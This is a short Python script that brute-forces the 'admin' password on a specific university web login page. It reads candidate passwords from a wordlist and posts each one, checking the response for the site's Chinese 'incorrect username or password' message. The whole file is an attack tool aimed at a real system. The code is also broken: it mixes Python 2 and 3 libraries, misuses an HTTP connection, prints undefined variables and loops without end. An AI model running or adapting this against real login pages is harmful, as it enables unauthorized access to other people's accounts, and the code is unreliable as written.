import urllib.request
import http.cookiejar
import os
import gzip
import re
import httplib

# head: dict of header
url = 'http://ski-ana.nwpu.edu.cn/login.aspx#'

def gerOpener(head):    
    cj = http.cookiejar.CookieJar()
    pro = urllib.request.HTTPCookieProcessor(cj)
    opener = urllib.request.build_opener(pro)
    header = []
    for key, value in head.items():
        elem = (key, value)
        header.append(elem)
    opener.addheaders = header
    return opener
header = {
    'Connection': 'Keep-Alive',
    'Accept': 'text/html, application/xhtml+xml, */*',
    'Accept-Language': 'en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3',
    # 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko'
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36',
}

opener = gerOpener(header)
conn = httplib.HTTPConnection(url)
uop = opener.open(url, timeout = 1000)
Txtuser = 'admin'
Txtpassword = ''
f = open('wordlist.txt')
i = 0
while True:
    print(i)
    Txtpassword = f.readline()
    postDict = {
        'Txtuser': Txtuser,
        'Txtpassword': Txtpassword,
    }
    postData = urllib.parse.urlencode(postDict).encode()
    uop = opener.open(url, postData)
    data = uop.read()
    responseText = conn.getresponse().read().decode('utf8')
    if not responseText.find(u'用户名或者密码不正确,请重新输入!') > 0 :
            print('*** find user:', user, 'with password:', passwd, '***')
    i += 1



print(data.decode())